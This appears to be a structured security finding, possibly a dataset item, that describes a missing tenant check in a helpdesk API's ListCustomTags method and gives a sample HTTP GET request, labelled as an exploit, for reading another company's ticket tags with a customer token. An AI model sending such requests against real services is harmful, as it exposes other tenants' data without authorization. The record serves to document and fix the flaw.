diagnosis: The ListCustomTags method finds tag entities associated with a ticket ID without verifying if the ticket belongs to the tenant of the requesting customer. An external customer can enumerate internal staff tags (e.g., 'vip-escalation', 'churn-risk') assigned to tickets of other companies.
exploit_request:
GET /support/tickets/tick_5021/tags HTTP/1.1
Host: helpdesk.saas.io
Authorization: Bearer customer_jwt_beta
Accept: application/json
